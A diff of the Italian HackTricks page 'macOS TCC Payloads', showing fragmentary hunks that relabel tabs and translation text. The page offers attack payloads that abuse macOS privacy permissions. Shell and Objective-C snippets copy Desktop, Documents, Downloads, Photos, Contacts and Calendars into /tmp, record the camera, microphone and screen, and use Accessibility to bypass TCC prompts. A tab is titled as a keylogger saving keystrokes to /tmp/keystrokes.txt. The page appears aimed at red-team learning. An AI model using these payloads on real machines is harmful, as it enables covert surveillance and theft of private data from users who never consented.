@@ -1,30 +1,28 @@
 # macOS TCC Payloads
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ### Desktop
 
-* **Autorizzazione**: Nessuna
+* **Entitlement**: Nessuno
 * **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 Copia `$HOME/Desktop` in `/tmp/desktop`.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -60,7 +58,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Copia `$HOME/Desktop` in `/tmp/desktop`.
-
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -69,15 +66,12 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 
 ### Documenti
 
-* **Entitlement**: Nessuno
+* **Autorizzazione**: Nessuna
 * **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 Copia `$HOME/Documents` in `/tmp/documents`.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -113,7 +107,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Copia `$HOME/`Documents in `/tmp/documents`.
-
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -122,15 +115,12 @@ cp -r "$HOME/Documents" "/tmp/documents"
 
 ### Download
 
-* **Entitlement**: Nessuno
+* **Autorizzazione**: Nessuna
 * **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 Copia `$HOME/Downloads` in `/tmp/downloads`.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -166,24 +156,20 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Copia `$HOME/Dowloads` in `/tmp/downloads`.
-
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
 {% endtab %}
 {% endtabs %}
 
-### Libreria di foto
+### Libreria Foto
 
-* **Entitlement**: `com.apple.security.personal-information.photos-library`
+* **Autorizzazione**: `com.apple.security.personal-information.photos-library`
 * **TCC**: `kTCCServicePhotos`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 Copia `$HOME/Pictures/Photos Library.photoslibrary` in `/tmp/photos`.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -219,7 +205,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Copia `$HOME/Pictures/Photos Library.photoslibrary` in `/tmp/photos`.
-
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -228,15 +213,12 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 
 ### Contatti
 
-* **Entitlement**: `com.apple.security.personal-information.addressbook`
+* **Autorizzazione**: `com.apple.security.personal-information.addressbook`
 * **TCC**: `kTCCServiceAddressBook`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC" %}
 Copia `$HOME/Library/Application Support/AddressBook` in `/tmp/contacts`.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -272,7 +254,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Copia `$HOME/Library/Application Support/AddressBook` in `/tmp/contacts`.
-
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
@@ -281,11 +262,12 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 
 ### Calendario
 
-* **Entitlement**: `com.apple.security.personal-information.calendars`
+* **Autorizzazione**: `com.apple.security.personal-information.calendars`
 * **TCC**: `kTCCServiceCalendar`
 
+{% tabs %}
+{% tab title="ObjectiveC" %}
 Copia `$HOME/Library/Calendars` in `/tmp/calendars`.
-
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -317,19 +299,24 @@ NSLog(@"Copy completed successfully.", error);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
 
+{% tab title="Shell" %}
 Copia `$HOME/Library/Calendars` in `/tmp/calendars`.
-
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
+{% endtab %}
+{% endtabs %}
+
+### Telecamera
+
+* **Autorizzazione**: `com.apple.security.device.camera`
+* **TCC**: `kTCCServiceCamera`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC - Registrare" %}
 Registra un video di 3 secondi e salvalo in **`/tmp/recording.mov`**
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -407,11 +394,8 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="undefined" %}
+{% tab title="ObjectiveC - Controllo" %}
 Controlla se il programma ha accesso alla fotocamera.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -445,7 +429,6 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Scatta una foto con la fotocamera
-
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
@@ -458,11 +441,8 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 * **TCC**: `kTCCServiceMicrophone`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjetiveC - Registrare" %}
 Registra 5 secondi di audio e salvalo in `/tmp/recording.m4a`
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -561,11 +541,8 @@ fclose(stderr); // Close the file stream
 ```
 {% endtab %}
 
-{% tab title="undefined" %}
+{% tab title="ObjectiveC - Controllo" %}
 Controlla se l'app ha accesso al microfono.
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -597,7 +574,6 @@ static void telegram(int argc, const char **argv) {
 
 {% tab title="Shell" %}
 Registra un audio di 5 secondi e salvalo in `/tmp/recording.wav`
-
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -610,18 +586,15 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 ### Posizione
 
 {% hint style="success" %}
-Perché un'app possa ottenere la posizione, **i Servizi di localizzazione** (da Privacy e sicurezza) **devono essere abilitati**, altrimenti non sarà in grado di accedervi.
+Affinché un'app possa ottenere la posizione, **i Servizi di Posizione** (da Privacy e Sicurezza) **devono essere abilitati,** altrimenti non sarà in grado di accedervi.
 {% endhint %}
 
-* **Entitlement**: `com.apple.security.personal-information.location`
+* **Autorizzazione**: `com.apple.security.personal-information.location`
 * **TCC**: Concesso in `/var/db/locationd/clients.plist`
 
 {% tabs %}
-{% tab title="undefined" %}
+{% tab title="ObjectiveC" %}
 Scrivi la posizione in `/tmp/logs.txt`
-{% endtab %}
-
-{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -670,23 +643,22 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 ```
 {% endtab %}
 
-{% tab title="undefined" %}
+{% tab title="Shell" %}
 Ottieni accesso alla posizione
-{% endtab %}
-
-{% tab title="undefined" %}
 ```
 ???
 ```
 {% endtab %}
+{% endtabs %}
 
-{% tab title="undefined" %}
+### Registrazione dello Schermo
+
+* **Autorizzazione**: Nessuna
+* **TCC**: `kTCCServiceScreenCapture`
+
 {% tabs %}
-{% tab title="undefined" %}
-Registra lo schermo principale per 5 secondi in `/tmp/screen.mov`
-{% endtab %}
-
-{% tab title="undefined" %}
+{% tab title="ObjectiveC" %}
+Registra lo schermo principale per 5s in `/tmp/screen.mov`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -743,29 +715,22 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {% endtab %}
 
 {% tab title="Shell" %}
-Registra lo schermo principale per 5 secondi
-
+Registra lo schermo principale per 5s
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {% endtab %}
 {% endtabs %}
-{% endtab %}
 
-{% tab title="undefined" %}
-#### Accessibilità
-{% endtab %}
+### Accessibilità
 
-{% tab title="undefined" %}
-* **Entitlement**: Nessuno
+* **Autorizzazione**: Nessuna
 * **TCC**: `kTCCServiceAccessibility`
-{% endtab %}
 
-{% tab title="undefined" %}
-Utilizza il privilegio TCC per accettare il controllo di Finder premendo il tasto Invio e bypassare TCC in questo modo
-{% endtab %}
+Usa il privilegio TCC per accettare il controllo del Finder premendo invio e bypassare TCC in questo modo
 
-{% tab title="undefined" %}
+{% tabs %}
+{% tab title="Accetta TCC" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -819,8 +784,7 @@ return 0;
 {% endtab %}
 
 {% tab title="Keylogger" %}
-Salva i tasti premuti in **`/tmp/keystrokes.txt`**
-
+Memorizza i tasti premuti in **`/tmp/keystrokes.txt`**
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -928,19 +892,20 @@ return 0;
 {% endtabs %}
 
 {% hint style="danger" %}
-**L'accessibilità è un permesso molto potente**, potresti abusarne in altri modi, ad esempio potresti eseguire l'attacco delle **keystrokes** solo da essa senza dover chiamare System Events.
+**L'accessibilità è un permesso molto potente**, potresti abusarne in altri modi, ad esempio potresti eseguire l'**attacco ai tasti** solo da essa senza dover chiamare System Events.
 {% endhint %}
+
+{% hint style="success" %}
+Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Supporta HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
+{% endhint %}
